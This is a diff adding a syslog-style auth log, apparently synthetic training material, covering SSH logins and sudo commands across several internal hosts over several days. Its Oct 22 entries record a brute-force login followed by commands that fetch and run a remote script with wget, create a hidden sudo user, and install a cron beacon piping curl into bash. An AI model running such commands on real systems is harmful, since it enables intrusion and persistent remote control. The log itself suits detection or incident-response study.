@@ -1,0 +1,71 @@
+Oct 19 08:40:00 ws-dev-03.corp.local sshd[17451]: Accepted password for a.khan from 10.10.0.50 port 34343 ssh2
+Oct 19 08:45:00 ws-dev-03.corp.local sudo[27555]: a.khan : TTY=pts/0 ; PWD=/home/a.khan ; USER=root ; COMMAND=/usr/bin/apt-get install -y jq
+Oct 19 09:05:00 db01.corp.local sshd[22284]: Accepted password for dba from 10.10.0.50 port 50711 ssh2
+Oct 19 09:12:00 ws-dev-03.corp.local sshd[9641]: Failed password for a.khan from 10.10.0.50 port 60504 ssh2
+Oct 19 09:15:00 web-srv-02.corp.local sshd[15996]: Accepted password for deploy from 10.10.0.50 port 37151 ssh2
+Oct 19 09:20:00 web-srv-02.corp.local sudo[15409]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/systemctl restart nginx
+Oct 19 09:25:00 db01.corp.local sudo[19278]: dba : TTY=pts/0 ; PWD=/home/dba ; USER=root ; COMMAND=/usr/bin/pg_dump -U postgres billing > /var/backups/billing.dump
+Oct 19 14:40:00 db01.corp.local sshd[6322]: Failed password for dba from 10.10.0.50 port 41601 ssh2
+Oct 20 08:40:00 ws-dev-03.corp.local sshd[20169]: Accepted password for a.khan from 10.10.0.50 port 44456 ssh2
+Oct 20 08:45:00 ws-dev-03.corp.local sudo[10549]: a.khan : TTY=pts/0 ; PWD=/home/a.khan ; USER=root ; COMMAND=/usr/bin/apt-get install -y jq
+Oct 20 08:55:00 ws-dev-03.corp.local sshd[8474]: Failed password for a.khan from 10.10.0.50 port 33192 ssh2
+Oct 20 08:56:00 ws-dev-03.corp.local sshd[4181]: Failed password for a.khan from 10.10.0.50 port 33810 ssh2
+Oct 20 09:05:00 db01.corp.local sshd[4606]: Accepted password for dba from 10.10.0.50 port 59786 ssh2
+Oct 20 09:15:00 web-srv-02.corp.local sshd[21831]: Accepted password for deploy from 10.10.0.50 port 45018 ssh2
+Oct 20 09:20:00 web-srv-02.corp.local sudo[9719]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/systemctl restart nginx
+Oct 20 09:25:00 db01.corp.local sudo[28655]: dba : TTY=pts/0 ; PWD=/home/dba ; USER=root ; COMMAND=/usr/bin/pg_dump -U postgres billing > /var/backups/billing.dump
+Oct 20 10:12:00 web-srv-02.corp.local sshd[27482]: Failed password for deploy from 10.10.0.50 port 57967 ssh2
+Oct 20 10:12:22 web-srv-02.corp.local sshd[20081]: Failed password for deploy from 10.10.0.50 port 34336 ssh2
+Oct 20 10:12:40 web-srv-02.corp.local sshd[2773]: Accepted password for deploy from 10.10.0.50 port 39083 ssh2
+Oct 21 02:05:00 web-srv-02.corp.local sshd[27797]: Failed password for invalid user admin from 198.51.100.23 port 40588 ssh2
+Oct 21 02:08:00 web-srv-02.corp.local sshd[4040]: Failed password for invalid user admin from 198.51.100.23 port 43842 ssh2
+Oct 21 02:11:00 web-srv-02.corp.local sshd[1399]: Failed password for invalid user admin from 198.51.100.23 port 58364 ssh2
+Oct 21 02:14:00 web-srv-02.corp.local sshd[5880]: Failed password for invalid user admin from 198.51.100.23 port 48060 ssh2
+Oct 21 02:17:00 web-srv-02.corp.local sshd[14374]: Failed password for invalid user admin from 198.51.100.23 port 57705 ssh2
+Oct 21 02:20:00 web-srv-02.corp.local sshd[20711]: Failed password for invalid user admin from 198.51.100.23 port 55975 ssh2
+Oct 21 08:40:00 ws-dev-03.corp.local sshd[29527]: Accepted password for a.khan from 10.10.0.50 port 56465 ssh2
+Oct 21 08:45:00 ws-dev-03.corp.local sudo[16857]: a.khan : TTY=pts/0 ; PWD=/home/a.khan ; USER=root ; COMMAND=/usr/bin/apt-get install -y jq
+Oct 21 09:05:00 db01.corp.local sshd[5878]: Accepted password for dba from 10.10.0.50 port 54043 ssh2
+Oct 21 09:05:00 web-srv-02.corp.local sshd[9277]: Failed password for deploy from 10.10.0.50 port 39011 ssh2
+Oct 21 09:15:00 web-srv-02.corp.local sshd[25832]: Accepted password for deploy from 10.10.0.50 port 44162 ssh2
+Oct 21 09:20:00 web-srv-02.corp.local sudo[4279]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/systemctl restart nginx
+Oct 21 09:25:00 db01.corp.local sudo[15517]: dba : TTY=pts/0 ; PWD=/home/dba ; USER=root ; COMMAND=/usr/bin/pg_dump -U postgres billing > /var/backups/billing.dump
+Oct 21 16:20:00 db01.corp.local sshd[15377]: Failed password for dba from 10.10.0.50 port 37083 ssh2
+Oct 22 03:00:00 web-srv-02.corp.local sshd[18020]: Failed password for root from 203.0.113.44 port 39197 ssh2
+Oct 22 03:01:00 web-srv-02.corp.local sshd[4836]: Failed password for invalid user admin from 203.0.113.44 port 59401 ssh2
+Oct 22 03:02:00 web-srv-02.corp.local sshd[3654]: Failed password for invalid user test from 203.0.113.44 port 48477 ssh2
+Oct 22 03:03:00 web-srv-02.corp.local sshd[23042]: Failed password for invalid user oracle from 203.0.113.44 port 46674 ssh2
+Oct 22 03:04:00 web-srv-02.corp.local sshd[19573]: Failed password for deploy from 203.0.113.44 port 40544 ssh2
+Oct 22 03:05:00 web-srv-02.corp.local sshd[20060]: Failed password for ubuntu from 203.0.113.44 port 42131 ssh2
+Oct 22 03:06:00 web-srv-02.corp.local sshd[5103]: Failed password for root from 203.0.113.44 port 48584 ssh2
+Oct 22 03:07:00 web-srv-02.corp.local sshd[22873]: Failed password for invalid user admin from 203.0.113.44 port 54647 ssh2
+Oct 22 03:08:00 web-srv-02.corp.local sshd[27321]: Failed password for invalid user test from 203.0.113.44 port 47983 ssh2
+Oct 22 03:09:00 web-srv-02.corp.local sshd[25616]: Failed password for invalid user oracle from 203.0.113.44 port 53243 ssh2
+Oct 22 03:10:00 web-srv-02.corp.local sshd[26168]: Failed password for deploy from 203.0.113.44 port 59229 ssh2
+Oct 22 03:11:00 web-srv-02.corp.local sshd[17309]: Failed password for ubuntu from 203.0.113.44 port 59480 ssh2
+Oct 22 03:14:00 web-srv-02.corp.local sshd[11197]: Accepted password for deploy from 203.0.113.44 port 41990 ssh2
+Oct 22 03:16:00 web-srv-02.corp.local sudo[29607]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://cdn-update-sync.com/ldr.sh -O /tmp/.x
+Oct 22 03:17:00 web-srv-02.corp.local sudo[13650]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash /tmp/.x
+Oct 22 03:18:00 web-srv-02.corp.local sudo[5362]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash svcmon
+Oct 22 03:18:02 web-srv-02.corp.local useradd[5320]: new user: name=svcmon, UID=1002, GID=1002, home=/home/svcmon, shell=/bin/bash
+Oct 22 03:19:00 web-srv-02.corp.local sudo[24121]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svcmon
+Oct 22 03:21:00 web-srv-02.corp.local CRON[12859]: (root) CMD (/usr/bin/curl -s http://cdn-update-sync.com/beacon | /bin/bash)
+Oct 22 03:21:00 web-srv-02.corp.local sudo[10810]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash -c 'echo "*/10 * * * * root /usr/bin/curl -s http://cdn-update-sync.com/beacon | /bin/bash" >> /etc/cron.d/sysmon'
+Oct 22 08:40:00 ws-dev-03.corp.local sshd[25448]: Accepted password for a.khan from 10.10.0.50 port 35841 ssh2
+Oct 22 08:45:00 ws-dev-03.corp.local sudo[9519]: a.khan : TTY=pts/0 ; PWD=/home/a.khan ; USER=root ; COMMAND=/usr/bin/apt-get install -y jq
+Oct 22 08:47:00 ws-dev-03.corp.local sshd[8740]: Failed password for a.khan from 10.10.0.50 port 31095 ssh2
+Oct 22 09:05:00 db01.corp.local sshd[18918]: Accepted password for dba from 10.10.0.50 port 37287 ssh2
+Oct 22 09:15:00 web-srv-02.corp.local sshd[25590]: Accepted password for deploy from 10.10.0.50 port 54200 ssh2
+Oct 22 09:20:00 web-srv-02.corp.local sudo[11666]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/systemctl restart nginx
+Oct 22 09:25:00 db01.corp.local sudo[7662]: dba : TTY=pts/0 ; PWD=/home/dba ; USER=root ; COMMAND=/usr/bin/pg_dump -U postgres billing > /var/backups/billing.dump
+Oct 22 13:33:00 db01.corp.local sshd[5923]: Failed password for dba from 10.10.0.50 port 39675 ssh2
+Oct 22 13:34:00 db01.corp.local sshd[10703]: Failed password for dba from 10.10.0.50 port 31260 ssh2
+Oct 23 08:40:00 ws-dev-03.corp.local sshd[15153]: Accepted password for a.khan from 10.10.0.50 port 50812 ssh2
+Oct 23 08:45:00 ws-dev-03.corp.local sudo[7859]: a.khan : TTY=pts/0 ; PWD=/home/a.khan ; USER=root ; COMMAND=/usr/bin/apt-get install -y jq
+Oct 23 09:05:00 db01.corp.local sshd[17904]: Accepted password for dba from 10.10.0.50 port 36760 ssh2
+Oct 23 09:15:00 web-srv-02.corp.local sshd[22546]: Accepted password for deploy from 10.10.0.50 port 49625 ssh2
+Oct 23 09:20:00 web-srv-02.corp.local sudo[18189]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/systemctl restart nginx
+Oct 23 09:22:00 web-srv-02.corp.local sshd[26753]: Failed password for deploy from 10.10.0.50 port 45870 ssh2
+Oct 23 09:25:00 db01.corp.local sudo[16796]: dba : TTY=pts/0 ; PWD=/home/dba ; USER=root ; COMMAND=/usr/bin/pg_dump -U postgres billing > /var/backups/billing.dump
+Oct 24 11:05:00 ws-dev-03.corp.local sshd[28191]: Failed password for a.khan from 10.10.0.50 port 49834 ssh2
+Oct 25 15:45:00 db01.corp.local sshd[27242]: Failed password for dba from 10.10.0.50 port 31019 ssh2
